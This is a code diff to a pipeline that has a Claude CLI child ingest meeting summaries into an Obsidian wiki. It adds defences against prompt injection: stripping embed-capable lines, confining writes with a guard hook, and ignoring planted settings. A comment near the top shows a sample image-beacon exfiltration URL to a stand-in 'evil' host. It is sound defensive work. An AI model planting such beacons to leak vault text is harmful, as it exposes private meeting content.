@@ -438,6 +438,63 @@ def verify_ingest(source_paths):
     return True, None
 
 
+# A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
+# ![](https://evil/?d=<vault text>) would ship whatever the child read. URLs can be spelled too
+# many ways to match, so the rule is syntax: any raw HTML tag, any image that isn't a well-formed
+# local embed, and any reference definition. Raw HTML in a child-written page is deleted on
+# purpose; wiki/CLAUDE.md already bans it because Obsidian mis-renders it.
+# ponytail: syntax-based and line-level, no markdown parser, so code fences, inline code and a
+# titled local image (![l](a.png "t")) lose their line too; the log names each one. Upgrade path:
+# a real markdown parser, if false deletions show up in the logs.
+HTML_TAG = re.compile(r"<[A-Za-z/]")
+# ![[x]] or ![alt](relative/path); a target opening with / or \ is out too (//host, \\host\share)
+LOCAL_EMBED = re.compile(r"!\[\[[^\]]*\]\]|!\[[^\]]*\]\([^()\s:/\\][^()\s:]*\)")
+REFDEF = re.compile(r"^\s*\[[^\]]*\]:")
+REFDEF_OPEN = re.compile(r"^\s*\[[^\]]*\]:\s*$")  # destination on the next line
+
+
+def strip_remote_images(paths):
+    """Delete embed-capable lines (see above) from the pages the child wrote, logging file and
+    line number for each. Never fails the run."""
+    for f in paths:
+        try:
+            lines = Path(f).read_text(encoding="utf-8").splitlines(keepends=True)
+            drop = set()
+            for i, line in enumerate(lines):
+                if (HTML_TAG.search(line) or "![" in LOCAL_EMBED.sub("", line) or REFDEF.match(line)):
+                    drop.add(i)
+                    if REFDEF_OPEN.match(line) and i + 1 < len(lines) and lines[i + 1][:1].isspace():
+                        drop.add(i + 1)
+            if drop:
+                for i in sorted(drop):
+                    log(f"  stripped embed-capable line {f}:{i + 1}: {lines[i].strip()[:120]}")
+                Path(f).write_text("".join(l for i, l in enumerate(lines) if i not in drop), encoding="utf-8")
+        except (OSError, UnicodeDecodeError) as e:
+            log(f"  image check skipped {f}: {e}")
+
+
+def written_paths(line):
+    """The wiki pages one stream-json event line writes: Write/Edit targets that resolve to a .md
+    under VAULT/wiki other than CLAUDE.md. Anything else is ignored, since a Write the guard will
+    deny still streams its tool_use event first."""
+    if '"tool_use"' not in line:
+        return []
+    try:
+        content = json.loads(line).get("message", {}).get("content") or []
+    except (ValueError, AttributeError):
+        return []
+    wiki, out = (VAULT / "wiki").resolve(), []
+    for c in content:
+        if not (isinstance(c, dict) and c.get("type") == "tool_use" and c.get("name") in ("Write", "Edit", "MultiEdit")
+                and isinstance(c.get("input"), dict) and isinstance(c["input"].get("file_path"), str)):
+            continue
+        real = (VAULT / c["input"]["file_path"]).resolve()  # an absolute file_path replaces VAULT
+        if (wiki in real.parents and real.suffix.lower() == ".md"
+                and real.name.lower() not in ("claude.md", "claude.local.md")):
+            out.append(real)
+    return out
+
+
 _SYSTEM_PROMPT_FILE = None
 
 
@@ -469,7 +526,8 @@ def guard_settings():
 
     The child's tools reach any path on disk, and the summaries it ingests are LLM output
     from whatever was said in a meeting. Confine every path-carrying tool to the vault and
-    the wiki skill the prompt tells it to read. See scripts/ingest-path-guard.py.
+    the wiki skill the prompt tells it to read, and Write/Edit to VAULT/wiki (the guard's
+    argument). See scripts/ingest-path-guard.py.
 
     Split out of ingest_to_wiki so the control itself is testable without running an ingest.
     """
@@ -478,10 +536,22 @@ def guard_settings():
     settings = json.dumps({"hooks": {"PreToolUse": [{
         "matcher": "Read|Glob|Grep|Write|Edit",
         "hooks": [{"type": "command",
-                   "command": f'"{sys.executable}" "{guard}"',
+                   "command": f'"{sys.executable}" "{guard}" "{VAULT / "wiki"}"',
                    "timeout": 5000}],
     }]}})
     return settings, os.pathsep.join(str(r) for r in roots)
+
+
+def prune_logs(days=30):
+    """Drop per-run ingest and lint logs older than `days`; they hold full meeting streams.
+    The digit after the dash keeps wiki-lint-launchd.log and ingest-system-prompt.md out."""
+    cutoff = datetime.now().timestamp() - days * 86400
+    for f in [*LOG_DIR.glob("ingest-[0-9]*.log"), *LOG_DIR.glob("wiki-lint-[0-9]*.log")]:
+        try:
+            if f.stat().st_mtime < cutoff:
+                f.unlink()
+        except OSError:
+            pass
 
 
 def ingest_to_wiki(source_paths, extra=""):
@@ -500,7 +570,8 @@ def ingest_to_wiki(source_paths, extra=""):
         "ensure every page you create or update has title and description frontmatter. "
         "Append ONE log entry at the END of wiki/log.md covering this batch. "
         "There is no shell in this session: use Grep, Glob, and Read to search and inspect, "
-        "and skip any doc step that says to run a script or the obsidian CLI."
+        "and skip any doc step that says to run a script or the obsidian CLI. "
+        "Glob and Grep must be given a path under wiki/."
         + (f"\nAdditional instructions for this batch: {extra}" if extra else "")
     )
     settings, roots = guard_settings()
@@ -511,16 +582,13 @@ def ingest_to_wiki(source_paths, extra=""):
            "--permission-mode", "acceptEdits",
            "--tools", "Read,Glob,Grep,Write,Edit",
            "--strict-mcp-config",
+           "--setting-sources", "user",  # a planted vault .claude/settings.json never loads
            "--append-system-prompt-file", str(ingest_system_prompt()),
            "--settings", settings,
            "--output-format", "stream-json", "--verbose"]
-    # Doppler injects ANTHROPIC_API_KEY; strip it so claude uses the subscription login, not API billing
-    import os
-    clean_env = {k: v for k, v in os.environ.items() if k != "ANTHROPIC_API_KEY"}
+    clean_env = claude_env(dict(os.environ))  # no API key, our child marker, the stored token
     clean_env["REKALL_GUARD_ROOTS"] = roots
     clean_env["REKALL_GUARD_LOG"] = str(LOG_DIR / "guard-denials.log")
-    claude_env(clean_env)
-    clean_env["MEMORY_STARTER_CHILD"] = "1"  # this claude -p call is our own child; skip recall hook + session digest for it
     # Stream claude's events into the logfile timestamped and truncated, so after
     # a timeout kill the last line names what the session was doing when it hung.
     proc = subprocess.Popen(cmd, cwd=VAULT, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -528,19 +596,21 @@ def ingest_to_wiki(source_paths, extra=""):
     timed_out = threading.Event()
     watchdog = threading.Timer(2400, lambda: (timed_out.set(), proc.kill()))
     watchdog.start()
-    auth_failed = False
+    auth_failed, written = False, []
     with open(logfile, "w") as f:
         for line in proc.stdout:
             line = line.rstrip()
+            written += written_paths(line)
             if '"error":"authentication_failed"' in line:
                 auth_failed = True
             # The final result line carries the real error text. Truncating it hid an expired
             # OAuth session behind a 0-token "<synthetic>" message for three runs (2026-10-26).
-            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] "
-                    f"{line if '\"type\":\"result\"' in line else line[:300]}\n")
+            keep = line if '"type":"result"' in line else line[:300]  # no backslash in an f-string expression before 3.12
+            f.write(f"[{datetime.now():%Y-%m-%d %H:%M:%S}] {keep}\n")
             f.flush()
     returncode = proc.wait()
     watchdog.cancel()
+    strip_remote_images(sorted(set(written)))  # whatever the outcome: a failed run can still have written pages
     if auth_failed:
         # The CLI can exit 0 on an auth-failed result, and its wording ("OAuth session expired and
         # could not be refreshed") matches none of AUTH_ERRORS, so report this explicitly instead
@@ -582,6 +652,7 @@ def main():
     if lock_fh is None:
         log("another pipeline run is active; exiting")
         return
+    prune_logs()
     age = token_age_days()
     if age is not None and age >= TOKEN_WARN_DAYS:  # ask before it expires, once a day at most
         prompt_reauth()
